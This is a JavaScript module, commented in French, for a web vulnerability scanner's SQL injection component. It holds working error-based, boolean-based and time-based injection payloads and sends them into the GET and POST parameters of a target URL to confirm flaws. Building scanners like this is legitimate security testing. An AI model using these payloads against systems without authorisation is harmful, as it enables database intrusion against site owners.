import { Scanner } from './Scanner.js'
import { removeTrailingSlash, sendRequest } from './utils.js' 

/**
 * Classe responsable de l'injection de payloads SQL
 * Elle teste différents types de SQL Injection :
 *  - Fuzzing
 *  - Error-based
 *  - Boolean-based
 *  - Time-based
 */
export class Injecter {

    //Payloads simples de fuzzing pour provoquer des erreurs SQL visibles
    static fuzzingPayload = ["'", '"', "%5C", "')", '")', '";', "';"];
    //Payloads pour détecter les injections SQL basées sur les erreurs
    static ErrorBasedPayload = [
        "' AND (SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))))a)--",
        "' AND 1=CAST((SELECT version()) AS INT)--",
        "' AND 1=CONVERT(int,@@version)--",    
    ];
    /**
     * Payloads pour les injections SQL booléennes (vrai / faux)
     * Chaque tableau contient :
     *  - une requête vraie
     *  - une requête fausse
     */
    static BooleanBasedPayload = [
        ["AND 1=1--", "AND 1=2--"],
        ["' AND 1=1--", "' AND 1=2--"],
        ['" AND 1=1--', '" AND 1=2--'],
        ["%' AND 1=1 AND '%'='--", "%' AND 1=2 AND '%'='--"]
    ];
    //Payloads pour détecter les injections SQL basées sur le temps
    static TimeBasedPayload = [
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "' AND 5=CAST((SELECT pg_sleep(5)) AS INT)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=dbms_pipe.receive_message('a',5)--"
    ];

    /**
     * @param {object} cible - Élément de l'attack surface (URL, méthode, paramètres)
     */
    constructor (cible) {
        this.cible = cible;
        //Résultat final du scan
        this.result = {
            confidence : "",
            score : 0,
            url : this.cible.url,
            parameter : "",
            vulnerabilityType : "",
            payloadSent : ""
        };
        //Réponse de référence sans injection
        this.baseline;
    }

    // ---------------------------------------------------------------------------

    //Méthode principale appelée par le scanner. Elle orchestre toutes les phases d'injection
    async inject() {
        this.baseline = await this.getBaselineResponse();
        const resultOfFuzzingPayload = await this.injectFuzzingPayload();
        if (resultOfFuzzingPayload === "END") {
            return this.result;
        } else if (resultOfFuzzingPayload === "CONTINUE") {
            await this.injectErrorPayload();
            return this.result;
        } else if (resultOfFuzzingPayload === "COMPLEX CONTINUE") {
            const resultOfBooleanPayload = await this.injectBooleanPayload();
            if(resultOfBooleanPayload === "END") {
                return this.result;
            }
            await this.injectTimeBasedPayload();
        }
        return this.result;
    }

    /**
     * Injection des payloads de fuzzing
     * @returns {string}
     */
    async injectFuzzingPayload() {
        for (const inject of Injecter.fuzzingPayload) {
            let injectedResults = await this.injectPayloadMultipleParams(inject);
            for (const injectedResult of injectedResults) {
                const scanResult = Scanner.scanFuzzingPayload(this.baseline, injectedResult.response, this);
                if (scanResult !== null) {
                    this.result.payloadSent = inject;
                    this.result.parameter = injectedResult.injectedParam;
                    return scanResult;
                }
            }
        }
        return "COMPLEX CONTINUE";
    }

    //Injection des payloads SQL Error-based
    async injectErrorPayload() {
        let payloads = this.changeErrorBasedPaylaods();
        for (const payload of payloads) {
            let injectedResult = await this.injectPayloadSimpleParam(payload, this.result.parameter);
            const scanResult = Scanner.checkSQLError(this.baseline, injectedResult.response, this);
            if (scanResult === "END") {
                this.result.payloadSent = payload;
                return "END";
            }
        }
        await this.injectErrorBasedRescuePayload();
        return "END";
    }

    //Tentative de confirmation avec un payload de secours
    async injectErrorBasedRescuePayload(){
        let payload = this.result.payloadSent + "--";
        let rescueInjection = await this.injectPayloadSimpleParam(payload, this.result.parameter);
        if(rescueInjection.response.status === 200) {
            this.changeResult(null, "Error SQL Injection", "CONFIRMED", 100, (this.result.payloadSent += " AND THEN " + payload));
        }
    }

    //Adapte les payloads Error-based au caractère injecté détecté
    changeErrorBasedPaylaods() {
        let payloads = [];
        for (const payload of Injecter.ErrorBasedPayload) {
            payloads.push(payload.replace("'", this.result.payloadSent));
        }
        return payloads;
    }

    //Injection SQL Boolean-based
    async injectBooleanPayload() {
        for (const [injection1, injection2] of Injecter.BooleanBasedPayload) {
            let responseTrue = await this.injectPayloadMultipleParams(injection1);
            let responseFalse = await this.injectPayloadMultipleParams(injection2);
            for (let i = 0; i < responseTrue.length; i++) {
                const scanResult = Scanner.scanBooleanPayload(responseTrue[i].response, responseFalse[i].response, this);
                if(scanResult) {
                    this.result.payloadSent = injection1 + " AND " + injection2;
                    return "END";
                }
            }
        }
        return "CONTINUE";
    }

    //Injection SQL basée sur le temps de réponse
    async injectTimeBasedPayload() {
        let durationMoyen = 0;
        // Calcul du temps de réponse moyen
        for (let i = 0; i < 3; i++) {
            const startTime = performance.now();
            await this.getBaselineResponse();
            const endTime = performance.now();
            durationMoyen += ((endTime - startTime) / 1000);
        }
        durationMoyen /= 3;
        for (const injection of Injecter.TimeBasedPayload) {
            for (const paramToInject of this.cible.params) {
                const startTime = performance.now();
                await this.injectPayloadSimpleParam(injection, paramToInject);
                const endTime = performance.now();
                const duration = (endTime - startTime) / 1000;
                if(duration > (5 + durationMoyen) * 0.9) {
                    this.changeResult(paramToInject, "TIME-BASED SQL Injection", "CONFIRMED", 90, injection);
                    return "END";
                }
            }
        }
        return "END";        
    }

    // ---------------------------------------------------------------------------

    //Récupère la réponse de référence sans injection
    async getBaselineResponse() {
        const params = this.createParams();
        if (this.cible.source === "link") {
            let craftedUrlBaseline = "";
            for (const [param, value] of params) {
                craftedUrlBaseline = removeTrailingSlash(this.cible.url) + `?${param}=${value}`;
            }
            return await sendRequest(craftedUrlBaseline);
        }
        return await sendRequest(this.cible.url);
    }

    //Génère la liste des paramètres avec des valeurs par défaut
    createParams(){
        return this.cible.params.map(param => {
            if(param instanceof Object) {
                return [Object.keys(param)[0], Object.values(param)[0]];
            }
            return [param, "1"];
        });
    }

    //Met à jour l'objet résultat
    changeResult(param = null, vulnerabilityType = null, confidence = null, score = null, payloadSent = null){
        if (param !== null) this.result.parameter = param;
        if (vulnerabilityType !== null) this.result.vulnerabilityType = vulnerabilityType;
        if (confidence !== null) this.result.confidence = confidence;
        if (score !== null) this.result.score = score;
        if (payloadSent !== null) this.result.payloadSent = payloadSent;
    }

    //Injecte un payload sur tous les paramètres
    async injectPayloadMultipleParams(payload) {
        if (this.cible.method === "POST") {
            return await this.injectPayloadsPOST(payload);
        }
        return await this.injectPayloadsGET(payload);
    }

    //Injection GET sur tous les paramètres
    async injectPayloadsGET(payload) {
        const params = this.createParams();
        let responses = [];
        for (const [paramToInject] of params) {
            const response = await this.injectPayloadsGETSimpleParam(payload, paramToInject, params);
            responses.push(response);
        }
        return responses;
    }

    //Injection POST sur tous les paramètres
    async injectPayloadsPOST(payload) {
        let responses = [];
        for (const param of this.cible.params) {
            const response = await this.injectPayloadsPOSTSimpleParam(payload, param);
            responses.push(response);
        }
        return responses;
    }

    //Injection ciblée sur un seul paramètre
    async injectPayloadSimpleParam(payload, paramToInject) {
        if (this.cible.method === "POST") {
            return await this.injectPayloadsPOSTSimpleParam(payload, paramToInject);
        }
        return await this.injectPayloadsGETSimpleParam(payload, paramToInject, this.createParams());
    }

    //Injection GET sur un seul paramètre
    async injectPayloadsGETSimpleParam(payload, paramToInject, params) {
        let craftedUrl = removeTrailingSlash(this.cible.url) + "?";
        for(const [param, value] of params) {
            if (param === paramToInject) {
                craftedUrl += `${param}=${payload}&`;
            } else {
                craftedUrl += `${param}=${value}&`;
            }
        }
        craftedUrl = craftedUrl.slice(0, -1);
        //console.log(`Injecting payload into (GET): ${craftedUrl}`);
        const response = await sendRequest(craftedUrl);
        return {
            injectedParam : paramToInject,
            response
        };
    }

    //Injection POST sur un seul paramètre (gestion CSRF incluse)
    async injectPayloadsPOSTSimpleParam(payload, paramToInject) {
        let postData = {};
        for (const param of this.cible.params) {
            if (param instanceof Object) {
                const key = Object.keys(param)[0];
                postData[key] = `${Object.values(param)[0]}`;
            } 
            else if (param === paramToInject) {
                postData[param] = payload;
            } 
            else {
                postData[param] = "test";
            }
        }
        //console.log(`Injecting payload into form (POST): ${this.cible.url}`);
        const response = await sendRequest(this.cible.url, "POST", postData);
        return {
            injectedParam : paramToInject,
            response
        };
    }
}